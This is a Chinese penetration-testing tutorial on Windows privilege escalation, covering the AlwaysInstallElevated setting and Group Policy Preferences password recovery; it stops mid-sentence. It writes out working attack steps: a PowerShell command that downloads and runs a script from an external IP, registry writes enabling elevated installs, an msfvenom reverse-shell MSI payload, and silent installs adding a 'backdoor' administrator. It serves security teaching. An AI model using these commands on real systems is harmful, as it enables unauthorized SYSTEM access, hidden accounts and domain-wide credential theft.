![](https://image.3001.net/images/20200925/1600998500_5f6d4c64238902539048a.png!small)

在上一节[《内网渗透测试：Windows权限提升思路（上）》](../247980.html)中，我们主要介绍了Windows系统内核溢出漏洞提权和windows系统错误配置漏洞提权的可信任服务路径漏洞提权、系统服务错误权限配置漏洞提权、自动安装配置文件提权。其中最常用的可能就是Windows系统内核溢出漏洞提权了，windows系统错误配置漏洞不仅可以用来提权，在获取高权限后还可以用来设置一个高权限后门，以备后用。

在本节中，我们将继续对windows系统错误配置漏洞提权中的注册表键AlwaysInstallElevated提权、组策略提权、令牌窃取等进行详细的讲解。

## AlwaysInstallElevated注册表键提权

注册表AlwaysInstallElevated是一个策略设置项。 **Windows允许低权限用户以system权限运行安装文件。**
如果启用此策略设置项，那么任何权限的用户都能以 NT AUTHORITY\SYSTEM 权限来 **安装恶意的 MSI（Microsoft Windows
Installer）文件** 。

>
> 利用AlwaysInstallElevated提权是一个2017年公开的技术，Metasploit和PowerUp都提供了利用方法，然而我在学习3gstudent的AlwaysInstallElevated提权时，他说过Metasploit生成的payload会由于Metasploit的某些原因会导致权限不够，所以只能去尝试其他的方法了。

先来说一下Windows Installer，Windows Installer 是Windows系统的组件之一，专门用来管理和配置软件服务。Windows
Installer分为 **客户端安装服务（Msiexec.exe）** 和 **MSI文件** 两部分，他们是一起工作的。 **Windows
Installer通过Msiexec.exe来安装MSI文件中包含的程序**
。MSI是微软格式的安装包，一般是程序的安装软件，包含安装和卸载软件时需要使用的大量指令和数据。Msiexec.exe用于安装MSI文件，一般在运行Microsoft
Update安装更新或者安装一些软件的时候使用。

###  **PathAlwaysInstallElevated漏洞产生的原因**

该漏洞产生的原因是用户在策略编辑器中开启了Windows Installer特权安装功能：

![](https://image.3001.net/images/20200925/1600998540_5f6d4c8cd7520ad5036c8.png!small)

在“运行”设置框中输入“gpedit.msc”，打开组策略编辑器。

> 组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
>
> 组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。

设置完毕，会在注册表的以下两个位置自动创建键值“1”。

>
> HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
>
>
> HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

想查询这两个键值最简单的方法就是使用内建的命令：

    
    
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

### 1\. PowerUp.ps1 下的实战利用

下载地址：<https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp>

我们先使用PowerUp.ps1脚本的 **Get-RegistryAlwaysInstallElevated** 模块来 **检查**
相关注册表是否被设置：

    
    
    powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powerup.ps1');Get-RegistryAlwaysInstallElevated

如下图显示“true”则表示AlwaysInstallElevated注册表已经被设置：

![](https://image.3001.net/images/20200925/1600998566_5f6d4ca6387c3c61cfe4c.png!small)

这就意味着MSI文件是以System权限运行的。如果返回的是“false”，则说明AlwaysInstallElevated注册表未被设置，我们可以用以下命令进行设置，进行注册表写入启动AlwaysInstallElevated：

    
    
    reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1  
    reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1

此时再执行powerup.sp1脚本就会发现返回true了。

接下来运行 **Write-UserAddMSI**
模块，将在当前目录生成MSI文件（msi文件内包含要执行的Payload，Payload将会以System权限执行）：

![](https://image.3001.net/images/20200925/1600998595_5f6d4cc3deca07431cefa.png!small)

这时，以普通用户权限运行UserAdd.msi，就会添加一个管理员账户。执行`msiexec /q /i
UserAdd.msi`时会弹出一个对话框，用来添加一个管理员用户：

![](https://image.3001.net/images/20200925/1600998616_5f6d4cd82ab9ab30f85b6.png!small)

msiexec相关参数解释如下：

> /quiet：安装过程中禁止向用户发送消息
>
> /qn：不使用GUI
>
> /q：隐藏安装界面
>
> /i：安装程序

如下图所示，成功添加一个名为backdoor的管理员用户：

![](https://image.3001.net/images/20200925/1600998638_5f6d4cee8fb0200c4f61c.png!small)

 **注意：**

>
> `C:\windows\installer\xxxx.tmp`和`c:\windows\installer\xxxx.msi`：xxxx.msi就是你当前运行的msi文件，它会保存在`c:\windows\installer\`下，当运行完关闭cmd之后，会留下一个xxxx.tmp，记录了安装操作，然后`C:\Users\dell\AppData\Local\Temp`缓存中也会保存xxxx.log日志文件
>
> 如果是域用户的话还需要请求域控制器通过才可以进行

### Metasploit 下的利用

Metasploit中相应的利用模块为`exploit/windows/local/always_install_elevated`，可以利用该模块来完成以上操作。使用该模块设置好SESSION，运行exploit后，会返回一个system权限的meterpreter。该模块会创建一个文件名随机的MSI文件，
**并在提权后删除所有已经部署的文件** 。

![](https://image.3001.net/images/20200925/1600998679_5f6d4d1781ad1ce5fefed.png!small)

如上图成功获取system权限。

Metasploit 下的实战利用除了`exploit/windows/local/always_install_elevated`模块外，还有以下
**制作.msi文件** 的操作。

生成弹出计算器的msi文件，命令如下：

    
    
    msfvenom -p windows/exec CMD=calc.exe -f msi > calc.msi  
    ​  
    msfvenom -p windows/exec CMD=<命令> -f msi > calc.msi

运行后生成test.msi，双击可以直接安装(普通用户权限下)，如图，弹出计算器

![](https://image.3001.net/images/20200925/1600998715_5f6d4d3b0d8714cb25a5c.png!small)

并且该计算器是以system权限运行的：

![](https://image.3001.net/images/20200925/1600998758_5f6d4d66562450d6fb318.png!small)

 **还可以使用以下方法直接生成msi格式的payload：**

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 –f msi -o shell.msi

并在用户的现有Meterpreter会话中，让我们将名为 **shell.msi**
的MSI文件上传到目标计算机。成功上传后，我们先开启一个新的msf监听，然后跳转到shell中执行MSI包文件：

    
    
    msiexec /quiet /qn /i shell.msi

>  **/ quiet** =在安装期间禁止向用户发送任何消息
>
>  **/ qn** =无GUI
>
>  **/ i** =常规（与管理）安装

执行后，新开启的监听中即可获得system权限的session。

### MSI Wrapper工具下的利用

下载地址：<https://www.exemsi.com/download/>

MSI
Wrapper是一个强大的MSI安装包的生产工具。它有一个友好的图形用户界面，操作简单直观，各种功能齐全，不需要任何知识的脚本可以产生满足要求的Windows安装程序安装程序。

 **（1）将Payload设置为执行shell.exe(一个msf马)：**

![](https://image.3001.net/images/20200925/1600998785_5f6d4d81a5d52646ddee3.png!small)

 **（2）设置为运行时要求提升权限：**

![](https://image.3001.net/images/20200925/1600998813_5f6d4d9d6380bc9d58263.png!small)

Application Id随便选：

![](https://image.3001.net/images/20200925/1600998838_5f6d4db6c54bbf0507fef.png!small)

其他配置按照默认设置即可，最后在你设置的output目录中生成了shell.msi

![](https://image.3001.net/images/20200925/1600998918_5f6d4e0600066e12245fb.png!small)

将生成的shell.msi上传到目标主机中，并开启一个新的msf监听，然后在shell中执行开shell.msi文件：

![](https://image.3001.net/images/20200925/1600998942_5f6d4e1e27de8c4ba8863.png!small)

如上图，成功获得system权限。

 **对于该漏洞，通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权了。**

## Windows组策略首选项提权

SYSVOL是活动目录里面的一个用于 **存储公共文件服务器副本**
的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放 **登录脚本** 、 **组策略数据** 及
**其他域控制器需要的域信息** 等。SYSVOL在所有经过身份验证的域用户或者域信任用户范围内共享，都可以读取。整个SYSVOL目录在所有的
**域控制器中** 是自动同步共享的， **所有的域策略均存放在`C:\Windows\SYSVOL\DOMAIN\Policies\`目录中**。

![](https://image.3001.net/images/20200925/1600998986_5f6d4e4aec07a295ba520.png!small)

![](https://image.3001.net/images/20200925/1600999012_5f6d4e64b8ef6b6c71cd8.png!small)

在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作， **网络管理员往往会使用域策略进行统一的配置和管理**
。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会利用组策略去批量修改本地管理员密码。
**但是这样就会出现一个问题，所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码，黑客就可以获取他们所有机器的管理权限。**

**管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。**
该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。

我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。

![](https://image.3001.net/images/20200925/1600999038_5f6d4e7e8d51f3ee1bff4.png!small)

![](https://image.3001.net/images/20200925/1600999060_5f6d4e94502ff52c75532.png!small)

如上图可以看到其中的cpassword项，保存的是加密后的内容，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES
256加密的私钥，地址如下：

> <https://msdn.microsoft.com/en-us/library/cc422924.aspx>

借助该私钥，我们就能还原出明文。

### PowerShell 下的利用

即PowerSploit中的Get-GPPPassword.ps1脚本

下载地址：<https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1>

PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的明文密

